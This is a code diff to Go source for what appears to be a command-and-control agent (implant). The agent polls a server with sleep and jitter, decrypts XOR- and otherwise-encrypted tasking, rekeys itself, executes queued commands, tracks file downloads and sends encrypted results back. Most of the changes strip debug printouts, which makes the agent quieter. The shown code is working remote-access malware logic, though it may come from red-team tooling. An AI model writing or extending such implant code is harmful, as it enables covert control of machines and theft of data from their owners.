@@ -64,7 +64,7 @@ func xorDecryptBytes(data []byte, key []byte) []byte {
 // tryDecryptResponse attempts to find and decrypt the XOR encrypted field
 func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
 	// Try each field in the response
-	for fieldName, fieldValue := range rawResponse {
+	for _, fieldValue := range rawResponse {
 		// Skip non-string fields
 		strValue, ok := fieldValue.(string)
 		if !ok {
@@ -88,7 +88,6 @@ func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[
 
 		// Check if it has expected fields (status is required)
 		if _, hasStatus := response["status"]; hasStatus {
-			fmt.Printf("[DEBUG] Successfully decrypted response from field '%s'\n", fieldName)
 			return response, nil
 		}
 	}
@@ -131,18 +130,6 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 	if method == "" {
 		method = "POST" // Fallback to default
 	}
-
-	// Print the request details for debugging
-	fmt.Printf("\n%s Request Details:\n", method)
-	fmt.Printf("URL: %s\n", postURL)
-	fmt.Printf("Method: %s\n", method)
-	fmt.Printf("Headers:\n")
-	fmt.Printf("  Content-Type: application/json\n")
-	fmt.Printf("  User-Agent: %s\n", decryptedValues["User Agent"])
-	for key, value := range customHeaders {
-		fmt.Printf("  %s: %s\n", key, value)
-	}
-	fmt.Printf("Body: %s\n\n", string(jsonData))
 
 	// Create request with custom method
 	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
@@ -247,7 +234,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// Check if this is an XOR encrypted response
 	if _, hasStatus := rawResponse["status"]; !hasStatus && len(rawResponse) > 0 {
 		// Likely encrypted, try to decrypt
-		fmt.Printf("[DEBUG] Response appears encrypted, attempting XOR decryption\n")
 
 		// Get current secret from secureComms
 		currentSecret := secureComms.secret1 // Direct access to field
@@ -256,7 +242,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
 		if err != nil {
 			// Couldn't decrypt, maybe it's a legacy response
-			fmt.Printf("[DEBUG] XOR decryption failed: %v, treating as legacy\n", err)
 			// Try to marshal raw response back into our struct
 			jsonBytes, _ := json.Marshal(rawResponse)
 			json.Unmarshal(jsonBytes, &response)
@@ -274,13 +259,10 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 	} else {
 		// Legacy unencrypted response
-		fmt.Printf("[DEBUG] Using legacy unencrypted response format\n")
 		jsonBytes, _ := json.Marshal(rawResponse)
 		json.Unmarshal(jsonBytes, &response)
 	}
 
-	fmt.Printf("[DEBUG] Received response - Status: %s, Has Data: %v\n",
-		response.Status, response.Data != "")
 
 	// Check for rekey command (special status that doesn't require decryption)
 	if response.Status == "rekey_required" {
@@ -314,16 +296,13 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 		// Queue the result to be sent back
 		if err := resultManager.AddResult(rekeyResult); err != nil {
-			fmt.Printf("[DEBUG] Error queueing rekey result: %v\n", err)
 		} else {
-			fmt.Printf("[DEBUG] Successfully queued rekey result for processing\n")
 		}
 
 		// Perform handshake refresh in a separate goroutine to avoid deadlock
 		go func() {
 			fmt.Println("[DEBUG] Starting rekey in background...")
 			if err := refreshHandshake(); err != nil {
-				fmt.Printf("[DEBUG] Rekey failed: %v\n", err)
 			} else {
 				fmt.Println("[DEBUG] Rekey completed successfully")
 			}
@@ -344,14 +323,12 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		decrypted, err := secureComms.DecryptMessage(response.Data)
 		if err != nil {
 			// Log decryption failure which might indicate key desync
-			fmt.Printf("[DEBUG] Decryption failed: %v\n", err)
 			fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")
 
 			// Automatically trigger rekey in background
 			go func() {
 				fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
 				if rekeyErr := refreshHandshake(); rekeyErr != nil {
-					fmt.Printf("[DEBUG] Automatic rekey failed: %v\n", rekeyErr)
 				} else {
 					fmt.Println("[DEBUG] Automatic rekey completed successfully")
 				}
@@ -373,7 +350,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		for {
 			result, err := commandQueue.ProcessNextCommand()
 			if err != nil {
-				fmt.Printf("[DEBUG] Error processing command: %v\n", err)
 				continue
 			}
 			if result == nil {
@@ -381,30 +357,9 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 				break
 			}
 			/*
-				fmt.Printf("[DEBUG] Processing command result:\n"+
-					"Command: %s\n"+
-					"Command DB ID: %d\n"+
-					"Agent ID: %s\n"+
-					"Filename: %s\n"+
-					"Current Chunk: %d\n"+
-					"Total Chunks: %d\n"+
-					"Output: %s\n"+
-					"Error: %v\n"+
-					"Exit Code: %d\n",
-					result.Command.Command,
-					result.Command.CommandDBID,
-					result.Command.AgentID,
-					result.Command.Filename,
-					result.Command.CurrentChunk,
-					result.Command.TotalChunks,
-					result.Output,
-					result.Error,
-					result.ExitCode)
 			*/
 			if err := resultManager.AddResult(result); err != nil {
-				fmt.Printf("[DEBUG] Error queueing result: %v\n", err)
 			} else {
-				fmt.Printf("[DEBUG] Successfully queued result for processing\n")
 			}
 		}
 		fmt.Println("[DEBUG] Command processing complete, rotating secret")
@@ -464,14 +419,12 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Get current sleep and jitter values at start of each iteration
 			baseSeconds, err := strconv.Atoi(sleep)
 			if err != nil {
-				fmt.Printf("Invalid sleep value '%s', using default: %v\n", sleep, err)
 				baseSeconds = 30 // Default to 30 seconds if invalid
 			}
 
 			// Get current jitter value
 			jitterValue, err := strconv.ParseFloat(jitter, 64)
 			if err != nil {
-				fmt.Printf("Invalid jitter value '%s', using default: %v\n", jitter, err)
 				jitterValue = 10.0 // Default to 10% if invalid
 			}
 
@@ -479,25 +432,13 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			if consecutiveErrors > 0 {
 				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
 				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
-				fmt.Printf("Error backoff: Attempt %d, waiting %v before retry\n",
-					consecutiveErrors, backoffInterval)
 				nextInterval = backoffInterval
-			} else {
-				fmt.Printf("Next poll in %v (base sleep: %ds, jitter: %.1f%%)\n",
-					nextInterval, baseSeconds, jitterValue)
 			}
 
 			// Handle pending results before sleep
 			if resultManager.HasResults() {
 				results := resultManager.GetPendingResults()
 				if len(results) > 0 {
-					// ADD DETAILED DEBUG LOGGING
-					fmt.Printf("[DEBUG Polling] Preparing to send %d results:\n", len(results))
-					for i, res := range results {
-						fmt.Printf("  [%d] cmd=%s, filename=%s, chunk=%d/%d, data_len=%d\n",
-							i, res.Command, res.Filename, res.CurrentChunk, res.TotalChunks, len(res.Data))
-					}
-
 					encryptedData := struct {
 						AgentID string            `json:"agent_id"`
 						Results []CommandResponse `json:"results"`
@@ -508,23 +449,19 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
 					jsonData, err := json.MarshalIndent(encryptedData, "", "    ")
 					if err != nil {
-						fmt.Printf("Error marshaling results: %v\n", err)
 					} else {
 						// ADD DEBUG TO SHOW JSON STRUCTURE
 						preview := string(jsonData)
 						if len(preview) > 500 {
 							preview = preview[:500] + "..."
 						}
-						fmt.Printf("[DEBUG Polling] JSON being sent (first 500 chars):\n%s\n", preview)
 
 						//fmt.Println(string(jsonData))
 						encrypted, err := secureComms.EncryptMessage(string(jsonData))
 						if err != nil {
-							fmt.Printf("Error encrypting results: %v\n", err)
 						} else {
 							// Updated call - no config parameter
 							if err := sendResults(encrypted, customHeaders); err != nil {
-								fmt.Printf("Error sending results: %v\n", err)
 							} else {
 								// Only cleanup after confirmed send
 								for _, result := range results {
@@ -532,7 +469,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 										commandQueue.mu.Lock()
 										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
 											delete(commandQueue.activeDownloads, result.Filename)
-											fmt.Printf("Download cleanup completed for %s after successful send\n", result.Filename)
 										}
 										commandQueue.mu.Unlock()
 									}
@@ -562,10 +498,8 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				}
 				// Check for decryption failures
 				if strings.Contains(err.Error(), "failed to decrypt response") {
-					fmt.Printf("[ERROR] Decryption failed, possible version mismatch: %v\n", err)
 					// Could trigger automatic rekey here if needed
 				}
-				fmt.Printf("Poll error: %v\n", err)
 				consecutiveErrors++
 			} else {
 				consecutiveErrors = 0
